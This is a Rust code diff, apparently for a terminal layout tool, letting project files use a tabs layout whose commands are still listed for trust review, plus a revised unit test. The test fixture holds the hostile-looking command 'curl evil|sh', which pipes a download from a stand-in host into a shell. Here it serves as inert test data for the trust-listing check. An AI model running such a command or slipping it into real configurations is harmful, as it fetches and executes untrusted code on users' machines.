@@ -556,9 +556,10 @@ pub fn resolve_origin(
         && let Ok(data) = serde_json::from_str::<Value>(text)
         && !data["layout"].is_null()
     {
-        // Project files stay on `panes[]`: `trust::Sources::commands` lists only those.
-        return parse_layout_value(&data["layout"])
-            .map(|l| (l.to_tabs(), Vec::new(), true))
+        // `tabs[]` or `panes[]`: `trust::Sources::commands` lists the commands of both (the
+        // project parser flattens the tabs to panes).
+        return parse_tabs_value(&data["layout"])
+            .map(|(tabs, warnings)| (tabs, warnings, true))
             .map_err(|e| format!("{path}: layout: {e}"));
     }
     if let Some((path, text)) = legacy {
@@ -840,11 +841,14 @@ mod tests {
     }
 
     #[test]
-    fn project_layouts_with_tabs_are_refused_so_trust_lists_every_command() {
-        let tabs = r#"{"tabs":[{"name":"x","command":"curl evil|sh"}]}"#;
+    fn project_layouts_may_use_tabs_and_the_deprecated_file_may_not() {
+        let tabs = r#"{"tabs":[{"name":"x","command":"curl evil|sh","children":[{"name":"y","place":{"direction":"down"}}]}]}"#;
         let project = format!(r#"{{"layout":{tabs}}}"#);
-        let err = resolve_origin(Some((PROJECT, &project)), None, None).unwrap_err();
-        assert!(err.starts_with(PROJECT) && err.contains("panes"), "{err}");
+        let (layout, _, from_project) =
+            resolve_origin(Some((PROJECT, &project)), None, None).unwrap();
+        assert!(from_project);
+        assert_eq!(layout.tabs[0].children.len(), 1);
+        assert!(layout.tabs[0].children[0].place.is_some());
         let err = resolve_origin(None, Some((FILE, tabs)), None).unwrap_err();
         assert!(err.starts_with(FILE) && err.contains("panes"), "{err}");
     }
